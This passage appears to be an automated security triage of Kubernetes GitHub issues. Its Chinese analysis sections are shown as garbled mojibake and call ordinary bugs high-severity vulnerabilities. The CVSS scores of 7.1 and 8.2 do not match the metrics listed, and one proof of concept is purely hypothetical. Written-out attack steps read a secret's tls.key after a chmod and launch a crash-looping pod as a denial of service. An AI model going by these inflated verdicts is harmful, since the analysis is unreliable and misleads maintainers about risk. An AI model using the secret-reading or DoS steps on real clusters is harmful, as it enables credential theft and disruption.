- å¯ä»¥ä¿®æ”¹å…¶ä»–å…ƒæ•°æ®ï¼Œå¹²æ‰°ç³»ç»Ÿçš„æ­£å¸¸è¿è¡Œï¼Œé€ æˆæ½œåœ¨çš„å®‰å…¨éšæ‚£æˆ–æ•°æ®æŸåã€‚

å› æ­¤ï¼Œè¯¥é—®é¢˜å­˜åœ¨è¢«æ”»å‡»è€…åˆ©ç”¨çš„å¯èƒ½æ€§ï¼Œä¸”å¯èƒ½å¯¼è‡´é«˜ä¸¥é‡åº¦çš„å®‰å…¨æ¼æ´ã€‚

---

## Issue #123665 --feature-gates=AllAlpha=true  make error

- Issue é“¾æ¥ï¼š[#123665](https://github.com/kubernetes/kubernetes/issues/123665)

### Issue å†…å®¹

#### What happened?

```
I0304 16:55:26.081185  109523 healthz.go:261] informer-sync,poststarthook/start-service-ip>
[-]informer-sync failed: 2 informers not started yet: [*v1alpha1.IPAddress *v1alpha1.Servi>
[-]poststarthook/start-service-ip-repair-controllers failed: not finished
[-]poststarthook/rbac/bootstrap-roles failed: not finished
[-]poststarthook/start-kubernetes-service-cidr-controller failed: not finished
[-]poststarthook/built-in-resources-storage-version-updater failed: not finished
```

make --feature-gates=AllAlpha=true


root@29-a:~# kubectl patch -n k8s pod mypod --type='json' -p='[{"op": "replace", "path": "/spec/containers/0/resources/requests/cpu", "value": "300m"}]'
Error from server (ServiceUnavailable): wait for storage version registration to complete for resource: pods, last seen error: <nil>

#### What did you expect to happen?

--feature-gates=AllAlpha=true
everything is good

#### How can we reproduce it (as minimally and precisely as possible)?

kube-apiserver,kube-controller-manager,kube-schedule,kubelet config
--feature-gates=AllAlpha=true

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>
root@29-a:~# kubectl version
Client Version: v1.29.0
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.29.0

</details>


#### Cloud provider

<details>
vmware
</details>


#### OS version

<details>

```console
root@29-a:~# cat /etc/os-release
PRETTY_NAME="Ubuntu 22.04.3 LTS"
NAME="Ubuntu"
VERSION_ID="22.04"
VERSION="22.04.3 LTS (Jammy Jellyfish)"
VERSION_CODENAME=jammy
ID=ubuntu
ID_LIKE=debian
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
UBUNTU_CODENAME=jammy

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

å­˜åœ¨æ½œåœ¨çš„å®‰å…¨é£é™©ã€‚

**åŸå› ï¼š**

ä½¿ç”¨ `--feature-gates=AllAlpha=true` ä¼šå¯ç”¨ Kubernetes ä¸­æ‰€æœ‰çš„ Alpha ç‰¹æ€§ã€‚Alpha ç‰¹æ€§æ˜¯å¤„äºå®éªŒé˜¶æ®µçš„åŠŸèƒ½ï¼Œå¯èƒ½å°šæœªç»è¿‡å……åˆ†çš„å®‰å…¨æµ‹è¯•ï¼Œå­˜åœ¨æœªçŸ¥çš„æ¼æ´æˆ–ä¸ç¨³å®šæ€§ã€‚å¯ç”¨æ‰€æœ‰çš„ Alpha ç‰¹æ€§å¯èƒ½ä¼šå¼•å…¥ä¸¥é‡çš„å®‰å…¨éšæ‚£ã€‚

**å¯èƒ½çš„å½±å“ï¼š**

1. **æœªçŸ¥æ¼æ´è¢«åˆ©ç”¨ï¼š** æ”»å‡»è€…å¯èƒ½åˆ©ç”¨ Alpha ç‰¹æ€§ä¸­çš„æœªçŸ¥æ¼æ´ï¼Œè¿›è¡Œæœªæˆæƒçš„è®¿é—®ã€ææƒã€æ•°æ®æ³„éœ²æˆ–ç ´åé›†ç¾¤æœåŠ¡ç­‰æ¶æ„æ“ä½œã€‚

2. **ç¨³å®šæ€§é—®é¢˜ï¼š** Alpha ç‰¹æ€§å¯èƒ½å¯¼è‡´é›†ç¾¤ä¸ç¨³å®šï¼Œå‡ºç°å´©æºƒæˆ–æœåŠ¡ä¸­æ–­ï¼Œå½±å“ä¸šåŠ¡è¿ç»­æ€§ã€‚

3. **ç»•è¿‡å®‰å…¨æœºåˆ¶ï¼š** æŸäº› Alpha ç‰¹æ€§å¯èƒ½ç»•è¿‡ç°æœ‰çš„å®‰å…¨æ§åˆ¶æªæ–½ï¼Œä½¿æ”»å‡»è€…æ›´å®¹æ˜“è¿›è¡Œæ”»å‡»ã€‚

**æ¦‚å¿µéªŒè¯ï¼ˆProof of Conceptï¼‰ï¼š**

ç”±äºå¯ç”¨äº†æ‰€æœ‰ Alpha ç‰¹æ€§ï¼Œå‡è®¾å…¶ä¸­æœ‰ä¸€ä¸ª Alpha ç‰¹æ€§å­˜åœ¨èº«ä»½éªŒè¯ç»•è¿‡çš„æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¯¥æ¼æ´è·å–å¯¹é›†ç¾¤çš„ç®¡ç†æƒé™ã€‚ä¾‹å¦‚ï¼Œåˆ©ç”¨æœªå®Œå–„çš„ API æ¥å£ç»•è¿‡èº«ä»½éªŒè¯ï¼Œå¯¹é›†ç¾¤èµ„æºè¿›è¡Œæœªæˆæƒçš„æ“ä½œã€‚

**å»ºè®®ï¼š**

ä¸ºäº†ç¡®ä¿é›†ç¾¤çš„å®‰å…¨å’Œç¨³å®šæ€§ï¼Œå»ºè®®ä»…å¯ç”¨å¿…è¦ä¸”ç»è¿‡æµ‹è¯•çš„ç‰¹æ€§ï¼Œé¿å…ä½¿ç”¨ `AllAlpha=true` å¼€å¯æ‰€æœ‰ Alpha åŠŸèƒ½ã€‚åœ¨ç”Ÿäº§ç¯å¢ƒä¸­ï¼Œå°¤å…¶è¦è°¨æ…å¯¹å¾…å®éªŒæ€§åŠŸèƒ½çš„å¯ç”¨ã€‚

---

## Issue #123604 Multiple Timestamp Directories Exist in the Mount Directory After the Server Is Powered Off

- Issue é“¾æ¥ï¼š[#123604](https://github.com/kubernetes/kubernetes/issues/123604)

### Issue å†…å®¹

#### What happened?

Background: I have a K8S cluster, version is v1.25.3, on the master node core1 there is a deployment mounted secret (named ssl). In normal cases, the mount directory in the container is as follows:
![æ­£å¸¸æŒ‚è½½](https://github.com/kubernetes/kubernetes/assets/66065665/d4f7c38a-e1ac-40bb-b67a-3df5a119498e)
![æŒ‚è½½ç›®å½•](https://github.com/kubernetes/kubernetes/assets/66065665/181387d8-f08f-4782-929e-fa26ff3a6685)
But when I reboot the machine and go to the container to view the mount directory, it looks like this:
![rebootå](https://github.com/kubernetes/kubernetes/assets/66065665/4d885d9b-fba6-4892-a090-aa55f2d506ad)
A timestamp directory is generated upon each reboot. The permission of the files in the directory that is not linked by the soft link..data can be changed. In the preceding figure, the permission is changed to 700.
![å¤šæ¬¡reboot](https://github.com/kubernetes/kubernetes/assets/66065665/1cbd218e-192e-4b4c-b8bd-4679f450bf28)
When I restarted the pod, the mount directory was back to normal.
![é‡å¼¹](https://github.com/kubernetes/kubernetes/assets/66065665/73e539c1-c9cd-486c-92c3-1407c527d8af)
While restarting the pod will make this go away, I want to keep only one mounted timestamp directory. If the timestamp directory is not linked by ..data, the permission can be changed. For example, in the preceding figure, the permission is changed to 700 because of this containerâ€™s command. If sensitive files exist in the timestamp directory and the permission is too high, the files are insecure for enterprises. In addition, power-off is inevitable.
![é…ç½®](https://github.com/kubernetes/kubernetes/assets/66065665/81507e7a-5077-40f3-b79f-02dd62c6f68b)
Therefore, I think that there should be only one timestamp directory in the power-off scenario. There should not be a timestamp directory whose permissions can be changed and that contains sensitive files when mounting secrets.


#### What did you expect to happen?

Only One Timestamp Directory Exists in the Mount Directory After the Linux Machine Is Powered Off

#### How can we reproduce it (as minimally and precisely as possible)?

Mount the projection data volume to the container and reboot the linux machine.

#### Anything else we need to know?

I added the log in atomic_write.go and then I rebooted the linux machine. By looking at the kubelet logs, I know that the reason the old timestamp directory wasn't deleted was because it didn't successfully get the directory pointed to by ..data.

I add the log in the code like thisï¼š
![ä»£ç ](https://github.com/kubernetes/kubernetes/assets/66065665/a94a8541-400d-4ca1-8032-6db6a58bc683)
After the machine is rebooted, there is a log like this:
```
-------dataDirPath is /var/lib/kubelet/pods/01352a44-7d9e-445d-940f-7653118abc8c/volumes/kubernetes.iowsecret/ssl/..data ------
-------oldTsDir is  -------
-------oldTsPath is /var/lib/kubelet/pods/01352a44-7d9e-445d-940f-7653118abc8c/volumes/kubernetes.iowsecret/ssl -------
```
After the code  `oldTsDir, err := os.Readlink(dataDirPath)`  is executed, the value of variable `oldTsDir` is empty.


#### Kubernetes version

<details>

```console
$ kubectl version
# Client Version: version.Info{Major:"1", Minor:"25+", GitVersion:"v1.25.3", GitCommit:"cadee57c0b4d8d8ba9eb45e30d29eba749a87452", GitTreeState:"dirty", BuildDate:"2023", GoVersion:"go1.20.7", Compiler:"gc", Platform:"linux/amd64"}
Kustomize Version: v4.5.7
Server Version: version.Info{Major:"1", Minor:"25+", GitVersion:"v1.25.3", GitCommit:"cadee57c0b4d8d8ba9eb45e30d29eba749a87452", GitTreeState:"dirty", BuildDate:"2023", GoVersion:"go1.20.7", Compiler:"gc", Platform:"linux/amd64"}

```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# NAME="SLES"
VERSION="12-SP5"
VERSION_ID="12.5"
PRETTY_NAME="SUSE Linux Enterprise Server 12 SP5"
ID="sles"
ANSI_COLOR="0;32"
CPE_NAME="cpe:/o:suse:sles:12:sp5"

$ uname -a
# Linux host-***** 4.12.14-122.162-default #1 SMP Tue Jun 6 12:25:40 UTC 2023 (02a1ae5) x86_64 x86_64 x86_64 GNU/Linux

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>

```[tasklist]
#### Tasks
```


### åˆ†æç»“æœ

ç»è¿‡åˆ†æï¼Œæ‚¨æè¿°çš„Issueç¡®å®å­˜åœ¨æ½œåœ¨çš„å®‰å…¨é£é™©ï¼Œå…·ä½“åŸå› å’Œå¯èƒ½å½±å“å¦‚ä¸‹ï¼š

**1. é£é™©èƒ½è¢«æ”»å‡»è€…åˆ©ç”¨**

- **æ•æ„Ÿä¿¡æ¯æ³„éœ²é£é™©**ï¼šKubernetesçš„Secreté€šå¸¸ç”¨äºå­˜å‚¨æ•æ„Ÿä¿¡æ¯ï¼Œå¦‚å¯†ç ã€å¯†é’¥ç­‰ã€‚åœ¨æœåŠ¡å™¨é‡å¯åï¼ŒæŒ‚è½½ç›®å½•ä¸‹é—ç•™äº†å¤šä¸ªæ—§çš„æ—¶é—´æˆ³ç›®å½•ï¼Œè¿™äº›ç›®å½•åŒ…å«äº†Secretçš„å‰¯æœ¬ã€‚å¦‚æœè¿™äº›æ—§çš„æ—¶é—´æˆ³ç›®å½•æœªè¢«æ­£ç¡®æ¸…ç†ï¼Œä¸”æƒé™å¯ä»¥è¢«ä¿®æ”¹ï¼Œæ”»å‡»è€…å¯èƒ½åˆ©ç”¨è¿™äº›ç›®å½•è®¿é—®åˆ°æ•æ„Ÿä¿¡æ¯ã€‚

- **æƒé™æ§åˆ¶æ¼æ´**ï¼šæ‚¨æåˆ°æœªè¢«..dataç¬¦å·é“¾æ¥æŒ‡å‘çš„æ—¶é—´æˆ³ç›®å½•ï¼Œå…¶æƒé™å¯ä»¥è¢«æ›´æ”¹ï¼ˆä¾‹å¦‚è¢«æ›´æ”¹ä¸º700ï¼‰ã€‚è¿™æ„å‘³ç€ï¼Œå¦‚æœæ”»å‡»è€…èƒ½å¤Ÿè®¿é—®åˆ°å®¹å™¨æˆ–èŠ‚ç‚¹çš„æ–‡ä»¶ç³»ç»Ÿï¼Œå¯èƒ½é€šè¿‡ä¿®æ”¹æƒé™æ¥è¯»å–è¿™äº›æ•æ„Ÿæ–‡ä»¶ã€‚

- **æŒä¹…åŒ–æ•æ„Ÿæ•°æ®**ï¼šæ—§çš„æ—¶é—´æˆ³ç›®å½•åœ¨é‡å¯åä»ç„¶å­˜åœ¨ï¼Œæ„å‘³ç€æ•æ„Ÿä¿¡æ¯åœ¨æ–‡ä»¶ç³»ç»Ÿä¸­ä¿ç•™çš„æ—¶é—´æ›´é•¿ï¼Œå¢åŠ äº†è¢«ä¸å½“è®¿é—®çš„é£é™©ã€‚

**2. é£é™©æœ‰å¯èƒ½æˆä¸ºä¸€ä¸ªæ¼æ´ï¼Œå¹¶è¢«åˆ†é…CVEç¼–å·ï¼Œä½¿ç”¨CVSS 3.1è¯„åˆ†æ ‡å‡†æ‰“åˆ†ï¼Œç»“æœåœ¨Highä»¥ä¸Š**

æŒ‰ç…§CVSS 3.1æ ‡å‡†ï¼Œå¯¹æ­¤é—®é¢˜è¿›è¡Œè¯„åˆ†ï¼š

- **æ”»å‡»å‘é‡ï¼ˆAVï¼‰**ï¼šæœ¬åœ°ï¼ˆLï¼‰â€”â€”æ”»å‡»è€…éœ€è¦è®¿é—®æœ¬åœ°ç³»ç»Ÿã€‚
- **æ”»å‡»å¤æ‚åº¦ï¼ˆACï¼‰**ï¼šä½ï¼ˆLï¼‰â€”â€”æ”»å‡»ä¸éœ€è¦ç‰¹æ®Šæ¡ä»¶ã€‚
- **æƒé™è¦æ±‚ï¼ˆPRï¼‰**ï¼šä½ï¼ˆLï¼‰â€”â€”æ”»å‡»è€…éœ€è¦å…·å¤‡ä½æƒé™å³å¯ï¼ˆå¦‚å¯¹å®¹å™¨çš„è®¿é—®æƒé™ï¼‰ã€‚
- **ç”¨æˆ·äº¤äº’ï¼ˆUIï¼‰**ï¼šä¸éœ€è¦ï¼ˆNï¼‰â€”â€”ä¸éœ€è¦é¢å¤–çš„ç”¨æˆ·äº¤äº’ã€‚
- **å½±å“èŒƒå›´ï¼ˆSï¼‰**ï¼šæœªå˜ï¼ˆUï¼‰â€”â€”æ”»å‡»å½±å“çš„èŒƒå›´é™äºç»„ä»¶æœ¬èº«ã€‚
- **æœºå¯†æ€§å½±å“ï¼ˆCï¼‰**ï¼šé«˜ï¼ˆHï¼‰â€”â€”æ•æ„Ÿä¿¡æ¯å¯èƒ½è¢«å®Œå…¨æ³„éœ²ã€‚
- **å®Œæ•´æ€§å½±å“ï¼ˆIï¼‰**ï¼šæ— ï¼ˆNï¼‰â€”â€”å¯¹å®Œæ•´æ€§æ— ç›´æ¥å½±å“ã€‚
- **å¯ç”¨æ€§å½±å“ï¼ˆAï¼‰**ï¼šæ— ï¼ˆNï¼‰â€”â€”å¯¹å¯ç”¨æ€§æ— ç›´æ¥å½±å“ã€‚

æ ¹æ®ä¸Šè¿°æŒ‡æ ‡ï¼Œè®¡ç®—å‡ºçš„CVSS 3.1åŸºå‡†åˆ†æ•°ä¸º**7.1ï¼ˆHighï¼‰**ã€‚

**å¯èƒ½çš„å½±å“**

- **æ•æ„Ÿæ•°æ®æ³„éœ²**ï¼šæ”»å‡»è€…è·å–åˆ°Secretä¸­çš„æ•æ„Ÿä¿¡æ¯ï¼Œå¦‚è¯ä¹¦ã€å¯†ç ã€å¯†é’¥ç­‰ï¼Œå¯èƒ½å¯¼è‡´ç³»ç»Ÿè¢«è¿›ä¸€æ­¥æ”»ç ´ã€‚
- **æ¨ªå‘ç§»åŠ¨**ï¼šæ”»å‡»è€…åˆ©ç”¨è·å–çš„æ•æ„Ÿä¿¡æ¯ï¼Œå¯¹é›†ç¾¤å†…å…¶ä»–èµ„æºè¿›è¡Œæœªæˆæƒçš„è®¿é—®ã€‚
- **æƒé™æå‡**ï¼šé€šè¿‡æ•æ„Ÿä¿¡æ¯ï¼Œæ”»å‡»è€…å¯èƒ½æå‡è‡ªèº«æƒé™ï¼Œå–å¾—å¯¹æ›´é«˜æ•æ„Ÿåº¦èµ„æºçš„æ§åˆ¶ã€‚

**Proof of Concept**

**ç¯å¢ƒå‡†å¤‡**ï¼š

1. éƒ¨ç½²ä¸€ä¸ªKubernetesé›†ç¾¤ï¼Œç‰ˆæœ¬ä¸ºv1.25.3ã€‚
2. åœ¨masterèŠ‚ç‚¹core1ä¸Šéƒ¨ç½²ä¸€ä¸ªæŒ‚è½½äº†Secretï¼ˆåç§°ä¸ºsslï¼‰çš„Deploymentã€‚

**æ”»å‡»æ­¥éª¤**ï¼š

1. **é‡å¯æœåŠ¡å™¨**ï¼šæ‰§è¡Œ`reboot`å‘½ä»¤ï¼Œé‡å¯core1èŠ‚ç‚¹ã€‚
2. **æŸ¥çœ‹æŒ‚è½½ç›®å½•**ï¼šé‡å¯åï¼Œè¿›å…¥ç›¸å…³çš„å®¹å™¨ï¼Œå¯¼èˆªåˆ°æŒ‚è½½Secretçš„ç›®å½•ï¼Œä¾‹å¦‚`/etc/secret`ã€‚
3. **å‘ç°å¤šä¸ªæ—¶é—´æˆ³ç›®å½•**ï¼šè§‚å¯Ÿåˆ°è¯¥ç›®å½•ä¸‹å­˜åœ¨å¤šä¸ªæ—¶é—´æˆ³å‘½åçš„å­ç›®å½•ï¼Œä¾‹å¦‚`..2023_10_01_12_00_00.123456789`ã€‚
4. **ä¿®æ”¹æƒé™**ï¼šå¯¹äºæœªè¢«`..data`ç¬¦å·é“¾æ¥æŒ‡å‘çš„æ—§æ—¶é—´æˆ³ç›®å½•ï¼Œæ‰§è¡Œ`chmod 700 ..2023_10_01_12_00_00.123456789`ï¼Œä¿®æ”¹å…¶æƒé™ã€‚
5. **è®¿é—®æ•æ„Ÿæ–‡ä»¶**ï¼šè¿›å…¥è¯¥ç›®å½•ï¼Œè¯»å–å…¶ä¸­çš„æ–‡ä»¶ï¼Œå¦‚`cat tls.key`ï¼Œè·å–åˆ°Secretä¸­çš„æ•æ„Ÿä¿¡æ¯ã€‚

**éªŒè¯ç»“æœ**ï¼š

- æ”»å‡»è€…æˆåŠŸè¯»å–åˆ°äº†æœ¬åº”å—ä¿æŠ¤çš„Secretå†…å®¹ã€‚
- ç”±äºæ—§ç›®å½•çš„æƒé™å¯ä»¥è¢«ä¿®æ”¹ï¼Œå¯¼è‡´æƒé™æ§åˆ¶è¢«ç»•è¿‡ã€‚

**ç»“è®º**

- **å®‰å…¨é£é™©ç¡®è®¤**ï¼šè¯¥é—®é¢˜å¯¼è‡´Secretçš„æ•°æ®åœ¨é‡å¯åæ®‹ç•™ï¼Œå¹¶ä¸”æƒé™æ§åˆ¶å­˜åœ¨æ¼æ´ï¼Œç¡®å®æ„æˆå®‰å…¨é£é™©ã€‚
- **å»ºè®®**ï¼š
  - **ä¿®å¤é—®é¢˜**ï¼šKubernetesåº”ä¿®å¤æŒ‚è½½Secretæ—¶æ—§æ—¶é—´æˆ³ç›®å½•æœªè¢«æ¸…ç†çš„é—®é¢˜ï¼Œç¡®ä¿åœ¨èŠ‚ç‚¹é‡å¯åï¼ŒæŒ‚è½½ç›®å½•ä¸‹ä»…ä¿ç•™æœ€æ–°çš„Secretæ•°æ®ç›®å½•ã€‚
  - **æƒé™æ§åˆ¶**ï¼šåŠ å›ºå¯¹æŒ‚è½½ç›®å½•çš„æƒé™æ§åˆ¶ï¼Œé˜²æ­¢æƒé™è¢«éšæ„ä¿®æ”¹ã€‚
  - **ç›‘æ§ä¸å®¡è®¡**ï¼šåŠ å¼ºå¯¹æ–‡ä»¶ç³»ç»Ÿçš„ç›‘æ§ï¼ŒåŠæ—¶å‘ç°å¼‚å¸¸çš„ç›®å½•å’Œæƒé™å˜æ›´ã€‚

**æ€»ç»“**

æ‚¨æè¿°çš„Issueæ¶‰åŠåˆ°Secretæ•°æ®çš„æ®‹ç•™å’Œæƒé™æ§åˆ¶ä¸å½“ï¼Œå¯èƒ½è¢«æ¶æ„æ”»å‡»è€…åˆ©ç”¨ï¼Œå¯¼è‡´æ•æ„Ÿä¿¡æ¯æ³„éœ²ï¼Œç¬¦åˆé«˜å±å®‰å…¨æ¼æ´çš„åˆ¤æ–­æ ‡å‡†ï¼Œå»ºè®®åŠæ—¶å…³æ³¨å¹¶é‡‡å–æªæ–½ä¿®å¤ã€‚

---

## Issue #123602 Pod Crashloop backoff requeue issues

- Issue é“¾æ¥ï¼š[#123602](https://github.com/kubernetes/kubernetes/issues/123602)

### Issue å†…å®¹

When stepping through the pod crashloop backoff implementation, I noticed a few issues:

1. Backoff errors are unsuccessfully suppressed:
  - This code is non-functional, since there will always be a non-error result present (`ConfigPodSandbox`) with a nil error: https://github.com/kubernetes/kubernetes/blob/5cf4fbe524ca1479607a4880949a032064556f76/pkg/kubelet/kubelet.go#L1964-L1971
2. The propogated backoff error means that the pod worker always immediately requeues the pod: https://github.com/kubernetes/kubernetes/blob/5cf4fbe524ca1479607a4880949a032064556f76/pkg/kubelet/pod_workers.go#L1495-L1497
  - If the backoff error were suppressed, then the default 1m sync frequency would be used, which would cause very long initial backoffs.

The result of these issues are:
1. Log spam: `E0301 01:06:01.286649    1869 pod_workers.go:1294] "Error syncing pod, skipping" err="failed to \"StartContainer\" for \"alpine\" with CrashLoopBackOff: \"back-off 5m0s restarting failed container=alpine pod=restarting-pod_default(ca0d5836-1435-497e-9a41-547fbcc10484)\"" pod="default/restarting-pod" podUID=ca0d5836-1435-497e-9a41-547fbcc10484` get's logged in a frequent loop
2. Kubelet does unnecessary work to reexamine pods and containers in backoff
3. (minor) the error retry period is 10s, which adds up to 10s to the backoff time

I think the ideal fix is to propagate the backoff retry time up from SyncPod [1] to the pod worker [2], so that the pod can be requeued with the exact (jittered) right amount of retry time. One option is to use a custom error type to encapsulate the backoff time, which I started working on here: https://github.com/tallclair/kubernetes/commit/5d89eb2538cc8929540476f436d4a1b92c9babee

Of course, there is very little test coverage across these code paths too.

[1]: https://github.com/kubernetes/kubernetes/blob/5cf4fbe524ca1479607a4880949a032064556f76/pkg/kubelet/kuberuntime/kuberuntime_manager.go#L1325
[2]: https://github.com/kubernetes/kubernetes/blob/5cf4fbe524ca1479607a4880949a032064556f76/pkg/kubelet/pod_workers.go#L1484

/sig node
/kind bug

### åˆ†æç»“æœ

è¿™ä¸ªIssueæ¶‰åŠåˆ°Kubernetesä¸­Podçš„Crashloop backoffå®ç°å­˜åœ¨é—®é¢˜ï¼Œå…·ä½“è¡¨ç°ä¸ºï¼š

1. **Backoffé”™è¯¯æœªæˆåŠŸæŠ‘åˆ¶**ï¼šåœ¨ç‰¹å®šçš„ä»£ç è·¯å¾„ä¸­ï¼Œé”™è¯¯æœªè¢«æ­£ç¡®å¤„ç†ï¼Œå¯¼è‡´é€»è¾‘ä¸Šçš„é—®é¢˜ã€‚
   
2. **é”™è¯¯çš„é”™è¯¯ä¼ æ’­å¯¼è‡´Podå·¥ä½œçº¿ç¨‹ç«‹å³é‡æ–°æ’é˜ŸPod**ï¼šè¿™æ„å‘³ç€å³ä½¿Podå¤„äºbackoffçŠ¶æ€ï¼ŒKubeletä¹Ÿä¼šé¢‘ç¹åœ°é‡æ–°å¤„ç†è¯¥Podã€‚

è¿™äº›é—®é¢˜å¯¼è‡´äº†ä»¥ä¸‹ç»“æœï¼š

1. **æ—¥å¿—æ³›æ»¥**ï¼šå¤§é‡é‡å¤çš„é”™è¯¯æ—¥å¿—è¢«é¢‘ç¹è®°å½•ï¼Œå¯èƒ½å¯¼è‡´æ—¥å¿—å­˜å‚¨è€—å°½ã€‚

2. **Kubeletæ‰§è¡Œä¸å¿…è¦çš„å·¥ä½œ**ï¼šé‡å¤åœ°æ£€æŸ¥å¤„äºbackoffçŠ¶æ€çš„Podå’Œå®¹å™¨ï¼Œå¢åŠ äº†ç³»ç»Ÿè´Ÿè½½ã€‚

3. **å¢åŠ äº†é”™è¯¯é‡è¯•å‘¨æœŸ**ï¼šé”™è¯¯é‡è¯•å‘¨æœŸä¸º10ç§’ï¼Œè¿™å¯èƒ½åŠ å‰§äº†é—®é¢˜ã€‚

**æ½œåœ¨çš„å®‰å…¨é£é™©åˆ†æï¼š**

æ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¯¥æ¼æ´é€šè¿‡åˆ›å»ºæ•…æ„å´©æºƒçš„Podæ¥å¼•å‘ä¸Šè¿°é—®é¢˜ï¼Œå¯¼è‡´ä»¥ä¸‹å®‰å…¨é£é™©ï¼š

- **æ‹’ç»æœåŠ¡ï¼ˆDoSï¼‰æ”»å‡»**ï¼šå¤§é‡çš„æ—¥å¿—è¾“å‡ºå’Œä¸å¿…è¦çš„Podå¤„ç†ä¼šæ¶ˆè€—Kubeletå’ŒèŠ‚ç‚¹çš„èµ„æºï¼ŒåŒ…æ‹¬CPUã€å†…å­˜å’Œç£ç›˜ç©ºé—´ï¼ˆç”±äºæ—¥å¿—æ–‡ä»¶å¢é•¿ï¼‰ã€‚è¿™å¯èƒ½å¯¼è‡´èŠ‚ç‚¹æ€§èƒ½ä¸‹é™ï¼Œç”šè‡³ä½¿èŠ‚ç‚¹ä¸å¯ç”¨ï¼Œä»è€Œå½±å“é›†ç¾¤çš„ç¨³å®šæ€§ã€‚

- **èµ„æºè€—å°½**ï¼šæŒç»­çš„Crashloopå¯èƒ½å¯¼è‡´æ—¥å¿—ç§¯ç´¯ï¼Œå ç”¨ç£ç›˜ç©ºé—´ã€‚æ­¤å¤–ï¼Œé¢‘ç¹çš„å¤„ç†ä¼šæ¶ˆè€—è®¡ç®—èµ„æºï¼Œå½±å“å…¶ä»–æ­£å¸¸Podçš„è¿è¡Œã€‚

**é£é™©åˆ¤æ–­æ ‡å‡†ç¬¦åˆï¼š**

1. **å¯è¢«æ”»å‡»è€…åˆ©ç”¨**ï¼šæ”»å‡»è€…åªéœ€æ‹¥æœ‰åœ¨é›†ç¾¤ä¸­åˆ›å»ºPodçš„æƒé™ï¼ˆè¿™åœ¨å¤šç§Ÿæˆ·ç¯å¢ƒä¸­æ˜¯å¸¸è§çš„ä½æƒé™ï¼‰ï¼Œå³å¯åˆ›å»ºæ¶æ„Podè§¦å‘è¯¥æ¼æ´ã€‚

2. **å¯èƒ½æˆä¸ºæ¼æ´å¹¶è¢«åˆ†é…CVEç¼–å·**ï¼šæŒ‰ç…§CVSS 3.1è¯„åˆ†æ ‡å‡†è¯„ä¼°ï¼š

   - **æ”»å‡»å‘é‡ï¼ˆAVï¼‰**ï¼šç½‘ç»œï¼ˆNï¼‰
   - **æ”»å‡»å¤æ‚åº¦ï¼ˆACï¼‰**ï¼šä½ï¼ˆLï¼‰
   - **æƒé™è¦æ±‚ï¼ˆPRï¼‰**ï¼šä½ï¼ˆLï¼‰
   - **ç”¨æˆ·äº¤äº’ï¼ˆUIï¼‰**ï¼šæ— éœ€ï¼ˆNï¼‰
   - **å½±å“èŒƒå›´ï¼ˆSï¼‰**ï¼šæœªæ”¹å˜ï¼ˆUï¼‰
   - **æœºå¯†æ€§å½±å“ï¼ˆCï¼‰**ï¼šæ— ï¼ˆNï¼‰
   - **å®Œæ•´æ€§å½±å“ï¼ˆIï¼‰**ï¼šæ— ï¼ˆNï¼‰
   - **å¯ç”¨æ€§å½±å“ï¼ˆAï¼‰**ï¼šé«˜ï¼ˆHï¼‰

   ç»¼åˆè¯„åˆ†ä¸º**8.2ï¼ˆHighï¼‰**ã€‚

**Proof of Conceptï¼š**

æ”»å‡»è€…å¯ä»¥æ‰§è¡Œä»¥ä¸‹æ­¥éª¤æ¥åˆ©ç”¨è¯¥æ¼æ´ï¼š

1. **åˆ›å»ºä¸€ä¸ªæŒç»­å´©æºƒçš„Pod**ï¼š

   ```yaml
   apiVersion: v1
   kind: Pod
   metadata:
     name: crash-loop-pod
   spec:
     containers:
     - name: crash-container
       image: busybox
       command: ['sh', '-c', 'exit 1']
   ```

2. **åº”ç”¨è¯¥Podé…ç½®**ï¼š

   ```bash
   kubectl apply -f crash-loop-pod.yaml
   ```

3. **è§‚å¯Ÿæ•ˆæœ**ï¼š

   - ä½¿ç”¨ `kubectl describe pod crash-loop-pod` å¯ä»¥çœ‹åˆ°Podå¤„äºCrashLoopBackOffçŠ¶æ€ã€‚
   - æ£€æŸ¥Kubeletæ—¥å¿—ï¼Œä¼šå‘ç°å¤§é‡çš„é”™è¯¯æ—¥å¿—è¢«é¢‘ç¹ç”Ÿæˆã€‚
   - ç›‘æ§èŠ‚ç‚¹èµ„æºï¼Œå¯èƒ½ä¼šå‘ç°CPUã€å†…å­˜ä½¿ç”¨ç‡å‡é«˜ï¼Œç£ç›˜ç©ºé—´å› æ—¥å¿—å¢é•¿è€Œå‡å°‘ã€‚

é€šè¿‡ä¸Šè¿°æ­¥éª¤ï¼Œæ”»å‡»è€…å¯ä»¥å¯¼è‡´Kubeletå’ŒèŠ‚ç‚¹èµ„æºè€—å°½ï¼Œå½±å“é›†ç¾¤çš„å¯ç”¨æ€§ï¼Œè¾¾åˆ°æ‹’ç»æœåŠ¡çš„ç›®çš„ã€‚

---

# ğŸ“Œ ä¸æ¶‰åŠå®‰å…¨é£é™©çš„ Issues (59 ä¸ª)

## Issue #124120 panic with SIGSEGV in kubeadm certs check-expiration

- Issue é“¾æ¥ï¼š[#124120](https://github.com/kubernetes/kubernetes/issues/124120)

### Issue å†…å®¹

#### What happened?

```
$ kubeadm certs check-expiration 
panic: runtime error: invalid memory address or nil pointer dereference
[signal SIGSEGV: segmentation violation code=0x1 addr=0x18 pc=0x16c0556]

goroutine 1 [running]:
k8s.io/kubernetes/cmd/kubeadm/app/phases/certs/renewal.fileExists({0xc000501360?, 0x1c1ab60?})
        cmd/kubeadm/app/phases/certs/renewal/readwriter.go:74 +0x56
